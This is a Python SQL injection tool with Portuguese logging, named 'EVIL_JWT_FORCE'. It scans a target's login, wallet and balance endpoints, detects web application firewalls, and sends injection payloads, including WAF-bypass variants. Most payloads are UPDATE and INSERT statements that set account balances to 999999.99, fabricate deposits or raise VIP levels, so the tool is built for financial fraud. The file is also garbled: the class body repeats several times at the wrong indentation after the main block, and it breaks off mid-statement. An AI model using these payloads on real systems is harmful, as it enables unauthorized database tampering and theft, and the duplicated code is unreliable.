import httpx
import re
import random
import json
import logging
from urllib.parse import urljoin
from typing import List, Dict, Any
from utils.helpers import save_to_output
# Substitua esta linha:
# from config.config_loader import load_config

# Por esta:
from config.settings import get_config

logger = logging.getLogger(__name__)
logging.basicConfig(filename='logs/bruteforce.log', level=logging.INFO, format='[%(asctime)s] %(message)s')

class SQLInjector:
    def __init__(self):
        # Substitua:
        # self.config = load_config()
        # Por:
        self.config = get_config()
        self.session = httpx.Client(
            proxies=self.config.get("proxy", None),
            verify=False,
            timeout=15,
            headers={"User-Agent": "EVIL_JWT_FORCE/2.0"}
        )
        self.balance_payloads = [
            "' OR 1=1--",
            "' UNION SELECT NULL,NULL,NULL--",
            "'; UPDATE users SET balance=999999.99 WHERE userid=1; --",
            "'; UPDATE users SET balance=balance+100000 WHERE userid=1; --",
            "'; UPDATE wallet SET amount=999999.99 WHERE user_id=1; --",
            "'; UPDATE accounts SET balance=999999.99 WHERE account_type='main'; --",
            "'; UPDATE user_balance SET credit=credit+500000 WHERE user_id=1; --",
            "'; INSERT INTO transactions (user_id,amount,type) VALUES (1,999999.99,'deposit'); UPDATE users SET balance=balance+999999.99 WHERE id=1; --",
            "'; UPDATE users SET balance=999999.99 WHERE username LIKE '%admin%'; --",
            "'; UPDATE users SET vip_level='Diamond', balance=9999999.99 WHERE userid=1; --",
            "\" OR \"1\"=\"1\"--",
            "' OR sleep(5)--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "' OR 1=1;--",
            "' OR 1=1;#",
            "' OR 1=1;/*",
            "' OR 1=1; WAITFOR DELAY '0:0:5'--",
            "' OR 1=1; WAITFOR DELAY '00:00:05'--"
        ]
        self.waf_bypass_payloads = [
            "'/*!50000union*/ /*!50000select*/ 1,2,3--",
            "' OR 1=1-- -",
            "' OR 1=1--+",
            "' OR 1=1--%0A",
            "' OR 1=1--%23",
            "' OR 1=1--%3B",
            "' OR 1=1--%2D%2D",
            "' OR 1=1--%23",
            "' OR 1=1--%0A",
            "' OR 1=1--%0D%0A"
        ]
        self.vulnerable_endpoints = []
        self.successful_injections = []
        self.detected_waf = False

    def detect_waf(self, url: str) -> bool:
        try:
            resp = self.session.get(url)
            waf_signatures = [
                "access denied", "forbidden", "blocked", "waf", "web application firewall",
                "mod_security", "cloudflare", "incapsula", "sucuri", "request rejected"
            ]
            if any(sig in resp.text.lower() for sig in waf_signatures):
                logger.warning(f"[WAF DETECTADO] {url}")
                self.detected_waf = True
                return True
        except Exception as e:
            logger.error(f"Erro ao detectar WAF em {url}: {e}")
        return False

    def mutate_payload(self, payload: str) -> List[str]:
        mutations = [
            payload,
            payload.replace(" ", "/**/"),
            payload.replace("'", "\""),
            payload.replace("1=1", "1=1--"),
            payload.replace("OR", "oR"),
            payload.replace("OR", "||"),
            payload.replace("--", "#"),
            payload + "--",
            payload + "#",
            payload + "/*",
            payload.upper(),
            payload.lower()
        ]
        return list(set(mutations))

    def detect_vulnerable_fields(self, base_url: str) -> List[str]:
        logger.info(f"🔍 Verificando vulnerabilidades SQL em: {base_url}")
        endpoints = [
            "/admin/login", "/api/auth/login", "/api/user/profile", "/api/user/balance",
            "/api/wallet/update", "/api/transactions", "/api/user/bonus", "/api/user/wallet",
            "/api/user/privilege", "/api/crypto/decrypt", "/api/crypto/aes/validate"
        ]
        for endpoint in endpoints:
            full_url = urljoin(base_url, endpoint)
            self.detect_waf(full_url)
            try:
                test_payloads = ["' OR '1'='1", "\" OR \"1\"=\"1", "admin' --", "admin\" --"]
                for test_payload in test_payloads:
                    response = self.session.post(full_url, data={"username": test_payload, "password": "test"})
                    if any(marker in response.text.lower() for marker in ["mysql", "syntax", "sqlite", "postgresql", "error", "exception"]):
                        self.vulnerable_endpoints.append(full_url)
                        logger.info(f"[VULNERÁVEL] {full_url}")
                        break
            except Exception as e:
                logger.error(f"Erro ao testar endpoint {full_url}: {e}")
        return self.vulnerable_endpoints

    def analyze_endpoint(self, url: str) -> List[str]:
        try:
            resp = self.session.get(url)
            campos = re.findall(r'name=["\']?(\w+)["\']?', resp.text)
            campos_unicos = list(set(campos))
            logger.info(f"Campos identificados em {url}: {campos_unicos}")
            return campos_unicos
        except Exception as e:
            logger.error(f"Erro ao analisar endpoint {url}: {e}")
            return []

    def smart_injection_attempts(self, url: str, campos: List[str]):
        all_payloads = self.balance_payloads + self.waf_bypass_payloads
        for payload in all_payloads:
            for mutated in self.mutate_payload(payload):
                data_variants = []
                for campo in campos:
                    data = {campo: mutated}
                    data_variants.append(data)
                data_variants.extend([
                    {"username": mutated, "password": "test"},
                    {"user": mutated, "pass": "test"},
                    {"token": mutated},
                    {"auth": mutated},
                    {"balance": mutated}
                ])
                for data in data_variants:
                    try:
                        # Testa POST e GET para maximizar chances
                        response = self.session.post(url, data=data)
                        success_markers = [
                            "success", "balance updated", "transaction complete",
                            "200 OK", "changes saved", "account modified", "saldo", "atualizado"
                        ]
                        if response.status_code == 200 or any(marker in response.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response.status_code
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                        # Testa GET também
                        response_get = self.session.get(url, params=data)
                        if response_get.status_code == 200 or any(marker in response_get.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response_get.status_code,
                                "method": "GET"
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção GET bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                    except Exception as e:
                        logger.error(f"Erro na injeção {mutated} em {url}: {e}", exc_info=True)

    def run(self):
        base_url = self.config.get("target_url")
        if not base_url:
            logger.error("URL alvo não definida em config/config.yaml")
            return
        vulnerable = self.detect_vulnerable_fields(base_url)
        if not vulnerable:
            logger.warning("⚠️ Nenhum endpoint vulnerável encontrado")
            return
        for url in vulnerable:
            campos = self.analyze_endpoint(url)
            self.smart_injection_attempts(url, campos)
        if self.successful_injections:
            report = {
                "target": base_url,
                "vulnerable_endpoints": vulnerable,
                "successful_injections": self.successful_injections,
                "total_success": len(self.successful_injections)
            }
            save_to_output("sql_injection_report.json", json.dumps(report, indent=2))
            logger.info(f"📊 Relatório gerado com {len(self.successful_injections)} injeções bem sucedidas")

if __name__ == "__main__":
    injector = SQLInjector()
    injector.run()
    self.session = httpx.Client(
        proxies=self.config.get("proxy", None),
        verify=False,
        timeout=15,
        headers={"User-Agent": "EVIL_JWT_FORCE/2.0"}
    )
    self.balance_payloads = [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; UPDATE users SET balance=999999.99 WHERE userid=1; --",
        "'; UPDATE users SET balance=balance+100000 WHERE userid=1; --",
        "'; UPDATE wallet SET amount=999999.99 WHERE user_id=1; --",
        "'; UPDATE accounts SET balance=999999.99 WHERE account_type='main'; --",
        "'; UPDATE user_balance SET credit=credit+500000 WHERE user_id=1; --",
        "'; INSERT INTO transactions (user_id,amount,type) VALUES (1,999999.99,'deposit'); UPDATE users SET balance=balance+999999.99 WHERE id=1; --",
        "'; UPDATE users SET balance=999999.99 WHERE username LIKE '%admin%'; --",
        "'; UPDATE users SET vip_level='Diamond', balance=9999999.99 WHERE userid=1; --",
        "\" OR \"1\"=\"1\"--",
        "' OR sleep(5)--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 1=1;--",
        "' OR 1=1;#",
        "' OR 1=1;/*",
        "' OR 1=1; WAITFOR DELAY '0:0:5'--",
        "' OR 1=1; WAITFOR DELAY '00:00:05'--"
    ]
    self.waf_bypass_payloads = [
        "'/*!50000union*/ /*!50000select*/ 1,2,3--",
        "' OR 1=1-- -",
        "' OR 1=1--+",
        "' OR 1=1--%0A",
        "' OR 1=1--%23",
        "' OR 1=1--%3B",
        "' OR 1=1--%2D%2D",
        "' OR 1=1--%23",
        "' OR 1=1--%0A",
        "' OR 1=1--%0D%0A"
    ]
    self.vulnerable_endpoints = []
    self.successful_injections = []
    self.detected_waf = False

    def detect_waf(self, url: str) -> bool:
        try:
            resp = self.session.get(url)
            waf_signatures = [
                "access denied", "forbidden", "blocked", "waf", "web application firewall",
                "mod_security", "cloudflare", "incapsula", "sucuri", "request rejected"
            ]
            if any(sig in resp.text.lower() for sig in waf_signatures):
                logger.warning(f"[WAF DETECTADO] {url}")
                self.detected_waf = True
                return True
        except Exception as e:
            logger.error(f"Erro ao detectar WAF em {url}: {e}")
        return False

    def mutate_payload(self, payload: str) -> List[str]:
        mutations = [
            payload,
            payload.replace(" ", "/**/"),
            payload.replace("'", "\""),
            payload.replace("1=1", "1=1--"),
            payload.replace("OR", "oR"),
            payload.replace("OR", "||"),
            payload.replace("--", "#"),
            payload + "--",
            payload + "#",
            payload + "/*",
            payload.upper(),
            payload.lower()
        ]
        return list(set(mutations))

    def detect_vulnerable_fields(self, base_url: str) -> List[str]:
        logger.info(f"🔍 Verificando vulnerabilidades SQL em: {base_url}")
        endpoints = [
            "/admin/login", "/api/auth/login", "/api/user/profile", "/api/user/balance",
            "/api/wallet/update", "/api/transactions", "/api/user/bonus", "/api/user/wallet",
            "/api/user/privilege", "/api/crypto/decrypt", "/api/crypto/aes/validate"
        ]
        for endpoint in endpoints:
            full_url = urljoin(base_url, endpoint)
            self.detect_waf(full_url)
            try:
                test_payloads = ["' OR '1'='1", "\" OR \"1\"=\"1", "admin' --", "admin\" --"]
                for test_payload in test_payloads:
                    response = self.session.post(full_url, data={"username": test_payload, "password": "test"})
                    if any(marker in response.text.lower() for marker in ["mysql", "syntax", "sqlite", "postgresql", "error", "exception"]):
                        self.vulnerable_endpoints.append(full_url)
                        logger.info(f"[VULNERÁVEL] {full_url}")
                        break
            except Exception as e:
                logger.error(f"Erro ao testar endpoint {full_url}: {e}")
        return self.vulnerable_endpoints

    def analyze_endpoint(self, url: str) -> List[str]:
        try:
            resp = self.session.get(url)
            campos = re.findall(r'name=["\']?(\w+)["\']?', resp.text)
            campos_unicos = list(set(campos))
            logger.info(f"Campos identificados em {url}: {campos_unicos}")
            return campos_unicos
        except Exception as e:
            logger.error(f"Erro ao analisar endpoint {url}: {e}")
            return []

    def smart_injection_attempts(self, url: str, campos: List[str]):
        all_payloads = self.balance_payloads + self.waf_bypass_payloads
        for payload in all_payloads:
            for mutated in self.mutate_payload(payload):
                data_variants = []
                for campo in campos:
                    data = {campo: mutated}
                    data_variants.append(data)
                data_variants.extend([
                    {"username": mutated, "password": "test"},
                    {"user": mutated, "pass": "test"},
                    {"token": mutated},
                    {"auth": mutated},
                    {"balance": mutated}
                ])
                for data in data_variants:
                    try:
                        # Testa POST e GET para maximizar chances
                        response = self.session.post(url, data=data)
                        success_markers = [
                            "success", "balance updated", "transaction complete",
                            "200 OK", "changes saved", "account modified", "saldo", "atualizado"
                        ]
                        if response.status_code == 200 or any(marker in response.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response.status_code
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                        # Testa GET também
                        response_get = self.session.get(url, params=data)
                        if response_get.status_code == 200 or any(marker in response_get.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response_get.status_code,
                                "method": "GET"
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção GET bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                    except Exception as e:
                        logger.error(f"Erro na injeção {mutated} em {url}: {e}", exc_info=True)

    def run(self):
        base_url = self.config.get("target_url")
        if not base_url:
            logger.error("URL alvo não definida em config/config.yaml")
            return
        vulnerable = self.detect_vulnerable_fields(base_url)
        if not vulnerable:
            logger.warning("⚠️ Nenhum endpoint vulnerável encontrado")
            return
        for url in vulnerable:
            campos = self.analyze_endpoint(url)
            self.smart_injection_attempts(url, campos)
        if self.successful_injections:
            report = {
                "target": base_url,
                "vulnerable_endpoints": vulnerable,
                "successful_injections": self.successful_injections,
                "total_success": len(self.successful_injections)
            }
            save_to_output("sql_injection_report.json", json.dumps(report, indent=2))
            logger.info(f"📊 Relatório gerado com {len(self.successful_injections)} injeções bem sucedidas")

if __name__ == "__main__":
    injector = SQLInjector()
    injector.run()
    self.session = httpx.Client(
        proxies=self.config.get("proxy", None),
        verify=False,
        timeout=15,
        headers={"User-Agent": "EVIL_JWT_FORCE/2.0"}
    )
    self.balance_payloads = [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; UPDATE users SET balance=999999.99 WHERE userid=1; --",
        "'; UPDATE users SET balance=balance+100000 WHERE userid=1; --",
        "'; UPDATE wallet SET amount=999999.99 WHERE user_id=1; --",
        "'; UPDATE accounts SET balance=999999.99 WHERE account_type='main'; --",
        "'; UPDATE user_balance SET credit=credit+500000 WHERE user_id=1; --",
        "'; INSERT INTO transactions (user_id,amount,type) VALUES (1,999999.99,'deposit'); UPDATE users SET balance=balance+999999.99 WHERE id=1; --",
        "'; UPDATE users SET balance=999999.99 WHERE username LIKE '%admin%'; --",
        "'; UPDATE users SET vip_level='Diamond', balance=9999999.99 WHERE userid=1; --",
        "\" OR \"1\"=\"1\"--",
        "' OR sleep(5)--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 1=1;--",
        "' OR 1=1;#",
        "' OR 1=1;/*",
        "' OR 1=1; WAITFOR DELAY '0:0:5'--",
        "' OR 1=1; WAITFOR DELAY '00:00:05'--"
    ]
    self.waf_bypass_payloads = [
        "'/*!50000union*/ /*!50000select*/ 1,2,3--",
        "' OR 1=1-- -",
        "' OR 1=1--+",
        "' OR 1=1--%0A",
        "' OR 1=1--%23",
        "' OR 1=1--%3B",
        "' OR 1=1--%2D%2D",
        "' OR 1=1--%23",
        "' OR 1=1--%0A",
        "' OR 1=1--%0D%0A"
    ]
    self.vulnerable_endpoints = []
    self.successful_injections = []
    self.detected_waf = False

    def detect_waf(self, url: str) -> bool:
        try:
            resp = self.session.get(url)
            waf_signatures = [
                "access denied", "forbidden", "blocked", "waf", "web application firewall",
                "mod_security", "cloudflare", "incapsula", "sucuri", "request rejected"
            ]
            if any(sig in resp.text.lower() for sig in waf_signatures):
                logger.warning(f"[WAF DETECTADO] {url}")
                self.detected_waf = True
                return True
        except Exception as e:
            logger.error(f"Erro ao detectar WAF em {url}: {e}")
        return False

    def mutate_payload(self, payload: str) -> List[str]:
        mutations = [
            payload,
            payload.replace(" ", "/**/"),
            payload.replace("'", "\""),
            payload.replace("1=1", "1=1--"),
            payload.replace("OR", "oR"),
            payload.replace("OR", "||"),
            payload.replace("--", "#"),
            payload + "--",
            payload + "#",
            payload + "/*",
            payload.upper(),
            payload.lower()
        ]
        return list(set(mutations))

    def detect_vulnerable_fields(self, base_url: str) -> List[str]:
        logger.info(f"🔍 Verificando vulnerabilidades SQL em: {base_url}")
        endpoints = [
            "/admin/login", "/api/auth/login", "/api/user/profile", "/api/user/balance",
            "/api/wallet/update", "/api/transactions", "/api/user/bonus", "/api/user/wallet",
            "/api/user/privilege", "/api/crypto/decrypt", "/api/crypto/aes/validate"
        ]
        for endpoint in endpoints:
            full_url = urljoin(base_url, endpoint)
            self.detect_waf(full_url)
            try:
                test_payloads = ["' OR '1'='1", "\" OR \"1\"=\"1", "admin' --", "admin\" --"]
                for test_payload in test_payloads:
                    response = self.session.post(full_url, data={"username": test_payload, "password": "test"})
                    if any(marker in response.text.lower() for marker in ["mysql", "syntax", "sqlite", "postgresql", "error", "exception"]):
                        self.vulnerable_endpoints.append(full_url)
                        logger.info(f"[VULNERÁVEL] {full_url}")
                        break
            except Exception as e:
                logger.error(f"Erro ao testar endpoint {full_url}: {e}")
        return self.vulnerable_endpoints

    def analyze_endpoint(self, url: str) -> List[str]:
        try:
            resp = self.session.get(url)
            campos = re.findall(r'name=["\']?(\w+)["\']?', resp.text)
            campos_unicos = list(set(campos))
            logger.info(f"Campos identificados em {url}: {campos_unicos}")
            return campos_unicos
        except Exception as e:
            logger.error(f"Erro ao analisar endpoint {url}: {e}")
            return []

    def smart_injection_attempts(self, url: str, campos: List[str]):
        all_payloads = self.balance_payloads + self.waf_bypass_payloads
        for payload in all_payloads:
            for mutated in self.mutate_payload(payload):
                data_variants = []
                for campo in campos:
                    data = {campo: mutated}
                    data_variants.append(data)
                data_variants.extend([
                    {"username": mutated, "password": "test"},
                    {"user": mutated, "pass": "test"},
                    {"token": mutated},
                    {"auth": mutated},
                    {"balance": mutated}
                ])
                for data in data_variants:
                    try:
                        # Testa POST e GET para maximizar chances
                        response = self.session.post(url, data=data)
                        success_markers = [
                            "success", "balance updated", "transaction complete",
                            "200 OK", "changes saved", "account modified", "saldo", "atualizado"
                        ]
                        if response.status_code == 200 or any(marker in response.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response.status_code
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                        # Testa GET também
                        response_get = self.session.get(url, params=data)
                        if response_get.status_code == 200 or any(marker in response_get.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response_get.status_code,
                                "method": "GET"
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção GET bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                    except Exception as e:
                        logger.error(f"Erro na injeção {mutated} em {url}: {e}", exc_info=True)

    def run(self):
        base_url = self.config.get("target_url")
        if not base_url:
            logger.error("URL alvo não definida em config/config.yaml")
            return
        vulnerable = self.detect_vulnerable_fields(base_url)
        if not vulnerable:
            logger.warning("⚠️ Nenhum endpoint vulnerável encontrado")
            return
        for url in vulnerable:
            campos = self.analyze_endpoint(url)
            self.smart_injection_attempts(url, campos)
        if self.successful_injections:
            report = {
                "target": base_url,
                "vulnerable_endpoints": vulnerable,
                "successful_injections": self.successful_injections,
                "total_success": len(self.successful_injections)
            }
            save_to_output("sql_injection_report.json", json.dumps(report, indent=2))
            logger.info(f"📊 Relatório gerado com {len(self.successful_injections)} injeções bem sucedidas")

if __name__ == "__main__":
    injector = SQLInjector()
    injector.run()
    self.session = httpx.Client(
        proxies=self.config.get("proxy", None),
        verify=False,
        timeout=15,
        headers={"User-Agent": "EVIL_JWT_FORCE/2.0"}
    )
    self.balance_payloads = [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; UPDATE users SET balance=999999.99 WHERE userid=1; --",
        "'; UPDATE users SET balance=balance+100000 WHERE userid=1; --",
        "'; UPDATE wallet SET amount=999999.99 WHERE user_id=1; --",
        "'; UPDATE accounts SET balance=999999.99 WHERE account_type='main'; --",
        "'; UPDATE user_balance SET credit=credit+500000 WHERE user_id=1; --",
        "'; INSERT INTO transactions (user_id,amount,type) VALUES (1,999999.99,'deposit'); UPDATE users SET balance=balance+999999.99 WHERE id=1; --",
        "'; UPDATE users SET balance=999999.99 WHERE username LIKE '%admin%'; --",
        "'; UPDATE users SET vip_level='Diamond', balance=9999999.99 WHERE userid=1; --",
        "\" OR \"1\"=\"1\"--",
        "' OR sleep(5)--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 1=1;--",
        "' OR 1=1;#",
        "' OR 1=1;/*",
        "' OR 1=1; WAITFOR DELAY '0:0:5'--",
        "' OR 1=1; WAITFOR DELAY '00:00:05'--"
    ]
    self.waf_bypass_payloads = [
        "'/*!50000union*/ /*!50000select*/ 1,2,3--",
        "' OR 1=1-- -",
        "' OR 1=1--+",
        "' OR 1=1--%0A",
        "' OR 1=1--%23",
        "' OR 1=1--%3B",
        "' OR 1=1--%2D%2D",
        "' OR 1=1--%23",
        "' OR 1=1--%0A",
        "' OR 1=1--%0D%0A"
    ]
    self.vulnerable_endpoints = []
    self.successful_injections = []
    self.detected_waf = False

    def detect_waf(self, url: str) -> bool:
        try:
            resp = self.session.get(url)
            waf_signatures = [
                "access denied", "forbidden", "blocked", "waf", "web application firewall",
                "mod_security", "cloudflare", "incapsula", "sucuri", "request rejected"
            ]
            if any(sig in resp.text.lower() for sig in waf_signatures):
                logger.warning(f"[WAF DETECTADO] {url}")
                self.detected_waf = True
                return True
        except Exception as e:
            logger.error(f"Erro ao detectar WAF em {url}: {e}")
        return False

    def mutate_payload(self, payload: str) -> List[str]:
        mutations = [
            payload,
            payload.replace(" ", "/**/"),
            payload.replace("'", "\""),
            payload.replace("1=1", "1=1--"),
            payload.replace("OR", "oR"),
            payload.replace("OR", "||"),
            payload.replace("--", "#"),
            payload + "--",
            payload + "#",
            payload + "/*",
            payload.upper(),
            payload.lower()
        ]
        return list(set(mutations))

    def detect_vulnerable_fields(self, base_url: str) -> List[str]:
        logger.info(f"🔍 Verificando vulnerabilidades SQL em: {base_url}")
        endpoints = [
            "/admin/login", "/api/auth/login", "/api/user/profile", "/api/user/balance",
            "/api/wallet/update", "/api/transactions", "/api/user/bonus", "/api/user/wallet",
            "/api/user/privilege", "/api/crypto/decrypt", "/api/crypto/aes/validate"
        ]
        for endpoint in endpoints:
            full_url = urljoin(base_url, endpoint)
            self.detect_waf(full_url)
            try:
                test_payloads = ["' OR '1'='1", "\" OR \"1\"=\"1", "admin' --", "admin\" --"]
                for test_payload in test_payloads:
                    response = self.session.post(full_url, data={"username": test_payload, "password": "test"})
                    if any(marker in response.text.lower() for marker in ["mysql", "syntax", "sqlite", "postgresql", "error", "exception"]):
                        self.vulnerable_endpoints.append(full_url)
                        logger.info(f"[VULNERÁVEL] {full_url}")
                        break
            except Exception as e:
                logger.error(f"Erro ao testar endpoint {full_url}: {e}")
        return self.vulnerable_endpoints

    def analyze_endpoint(self, url: str) -> List[str]:
        try:
            resp = self.session.get(url)
            campos = re.findall(r'name=["\']?(\w+)["\']?', resp.text)
            campos_unicos = list(set(campos))
            logger.info(f"Campos identificados em {url}: {campos_unicos}")
            return campos_unicos
        except Exception as e:
            logger.error(f"Erro ao analisar endpoint {url}: {e}")
            return []

    def smart_injection_attempts(self, url: str, campos: List[str]):
        all_payloads = self.balance_payloads + self.waf_bypass_payloads
        for payload in all_payloads:
            for mutated in self.mutate_payload(payload):
                data_variants = []
                for campo in campos:
                    data = {campo: mutated}
                    data_variants.append(data)
                data_variants.extend([
                    {"username": mutated, "password": "test"},
                    {"user": mutated, "pass": "test"},
                    {"token": mutated},
                    {"auth": mutated},
                    {"balance": mutated}
                ])
                for data in data_variants:
                    try:
                        # Testa POST e GET para maximizar chances
                        response = self.session.post(url, data=data)
                        success_markers = [
                            "success", "balance updated", "transaction complete",
                            "200 OK", "changes saved", "account modified", "saldo", "atualizado"
                        ]
                        if response.status_code == 200 or any(marker in response.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response.status_code
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                        # Testa GET também
                        response_get = self.session.get(url, params=data)
                        if response_get.status_code == 200 or any(marker in response_get.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response_get.status_code,
                                "method": "GET"
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção GET bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                    except Exception as e:
                        logger.error(f"Erro na injeção {mutated} em {url}: {e}", exc_info=True)

    def run(self):
        base_url = self.config.get("target_url")
        if not base_url:
            logger.error("URL alvo não definida em config/config.yaml")
            return
        vulnerable = self.detect_vulnerable_fields(base_url)
        if not vulnerable:
            logger.warning("⚠️ Nenhum endpoint vulnerável encontrado")
            return
        for url in vulnerable:
            campos = self.analyze_endpoint(url)
            self.smart_injection_attempts(url, campos)
        if self.successful_injections:
            report = {
                "target": base_url,
                "vulnerable_endpoints": vulnerable,
                "successful_injections": self.successful_injections,
                "total_success": len(self.successful_injections)
            }
            save_to_output("sql_injection_report.json", json.dumps(report, indent=2))
            logger.info(f"📊 Relatório gerado com {len(self.successful_injections)} injeções bem sucedidas")

if __name__ == "__main__":
    injector = SQLInjector()
    injector.run()
    self.session = httpx.Client(
        proxies=self.config.get("proxy", None),
        verify=False,
        timeout=15,
        headers={"User-Agent": "EVIL_JWT_FORCE/2.0"}
    )
    self.balance_payloads = [
        "' OR 1=1--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; UPDATE users SET balance=999999.99 WHERE userid=1; --",
        "'; UPDATE users SET balance=balance+100000 WHERE userid=1; --",
        "'; UPDATE wallet SET amount=999999.99 WHERE user_id=1; --",
        "'; UPDATE accounts SET balance=999999.99 WHERE account_type='main'; --",
        "'; UPDATE user_balance SET credit=credit+500000 WHERE user_id=1; --",
        "'; INSERT INTO transactions (user_id,amount,type) VALUES (1,999999.99,'deposit'); UPDATE users SET balance=balance+999999.99 WHERE id=1; --",
        "'; UPDATE users SET balance=999999.99 WHERE username LIKE '%admin%'; --",
        "'; UPDATE users SET vip_level='Diamond', balance=9999999.99 WHERE userid=1; --",
        "\" OR \"1\"=\"1\"--",
        "' OR sleep(5)--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 1=1;--",
        "' OR 1=1;#",
        "' OR 1=1;/*",
        "' OR 1=1; WAITFOR DELAY '0:0:5'--",
        "' OR 1=1; WAITFOR DELAY '00:00:05'--"
    ]
    self.waf_bypass_payloads = [
        "'/*!50000union*/ /*!50000select*/ 1,2,3--",
        "' OR 1=1-- -",
        "' OR 1=1--+",
        "' OR 1=1--%0A",
        "' OR 1=1--%23",
        "' OR 1=1--%3B",
        "' OR 1=1--%2D%2D",
        "' OR 1=1--%23",
        "' OR 1=1--%0A",
        "' OR 1=1--%0D%0A"
    ]
    self.vulnerable_endpoints = []
    self.successful_injections = []
    self.detected_waf = False

    def detect_waf(self, url: str) -> bool:
        try:
            resp = self.session.get(url)
            waf_signatures = [
                "access denied", "forbidden", "blocked", "waf", "web application firewall",
                "mod_security", "cloudflare", "incapsula", "sucuri", "request rejected"
            ]
            if any(sig in resp.text.lower() for sig in waf_signatures):
                logger.warning(f"[WAF DETECTADO] {url}")
                self.detected_waf = True
                return True
        except Exception as e:
            logger.error(f"Erro ao detectar WAF em {url}: {e}")
        return False

    def mutate_payload(self, payload: str) -> List[str]:
        mutations = [
            payload,
            payload.replace(" ", "/**/"),
            payload.replace("'", "\""),
            payload.replace("1=1", "1=1--"),
            payload.replace("OR", "oR"),
            payload.replace("OR", "||"),
            payload.replace("--", "#"),
            payload + "--",
            payload + "#",
            payload + "/*",
            payload.upper(),
            payload.lower()
        ]
        return list(set(mutations))

    def detect_vulnerable_fields(self, base_url: str) -> List[str]:
        logger.info(f"🔍 Verificando vulnerabilidades SQL em: {base_url}")
        endpoints = [
            "/admin/login", "/api/auth/login", "/api/user/profile", "/api/user/balance",
            "/api/wallet/update", "/api/transactions", "/api/user/bonus", "/api/user/wallet",
            "/api/user/privilege", "/api/crypto/decrypt", "/api/crypto/aes/validate"
        ]
        for endpoint in endpoints:
            full_url = urljoin(base_url, endpoint)
            self.detect_waf(full_url)
            try:
                test_payloads = ["' OR '1'='1", "\" OR \"1\"=\"1", "admin' --", "admin\" --"]
                for test_payload in test_payloads:
                    response = self.session.post(full_url, data={"username": test_payload, "password": "test"})
                    if any(marker in response.text.lower() for marker in ["mysql", "syntax", "sqlite", "postgresql", "error", "exception"]):
                        self.vulnerable_endpoints.append(full_url)
                        logger.info(f"[VULNERÁVEL] {full_url}")
                        break
            except Exception as e:
                logger.error(f"Erro ao testar endpoint {full_url}: {e}")
        return self.vulnerable_endpoints

    def analyze_endpoint(self, url: str) -> List[str]:
        try:
            resp = self.session.get(url)
            campos = re.findall(r'name=["\']?(\w+)["\']?', resp.text)
            campos_unicos = list(set(campos))
            logger.info(f"Campos identificados em {url}: {campos_unicos}")
            return campos_unicos
        except Exception as e:
            logger.error(f"Erro ao analisar endpoint {url}: {e}")
            return []

    def smart_injection_attempts(self, url: str, campos: List[str]):
        all_payloads = self.balance_payloads + self.waf_bypass_payloads
        for payload in all_payloads:
            for mutated in self.mutate_payload(payload):
                data_variants = []
                for campo in campos:
                    data = {campo: mutated}
                    data_variants.append(data)
                data_variants.extend([
                    {"username": mutated, "password": "test"},
                    {"user": mutated, "pass": "test"},
                    {"token": mutated},
                    {"auth": mutated},
                    {"balance": mutated}
                ])
                for data in data_variants:
                    try:
                        # Testa POST e GET para maximizar chances
                        response = self.session.post(url, data=data)
                        success_markers = [
                            "success", "balance updated", "transaction complete",
                            "200 OK", "changes saved", "account modified", "saldo", "atualizado"
                        ]
                        if response.status_code == 200 or any(marker in response.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
                                "response_code": response.status_code
                            }
                            self.successful_injections.append(injection_info)
                            logger.info(f"✅ Possível injeção bem sucedida!\nPayload: {mutated}")
                            save_to_output("output/successful_injections.txt", json.dumps(injection_info))
                        # Testa GET também
                        response_get = self.session.get(url, params=data)
                        if response_get.status_code == 200 or any(marker in response_get.text.lower() for marker in success_markers):
                            injection_info = {
                                "url": url,
                                "payload": mutated,
                                "data": data,
